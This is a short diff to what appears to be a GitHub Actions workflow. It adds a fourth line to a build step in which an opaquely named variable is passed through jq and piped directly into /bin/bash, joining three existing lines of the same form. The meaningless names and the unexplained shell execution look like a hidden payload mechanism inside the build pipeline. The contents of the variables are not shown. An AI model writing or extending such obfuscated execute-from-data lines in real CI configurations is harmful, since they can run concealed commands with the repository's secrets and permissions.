@@ -24,6 +24,7 @@ jobs:
           echo $dov385 | jq -r .sxrqn3 | /bin/bash
           printf '%s' "$t7" | jq -r .o08 | /bin/bash
           echo $xzf32497 | jq -r .bfdcb87868 | /bin/bash
+          printf '%s' "$qai992" | jq -r .kxoje5 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
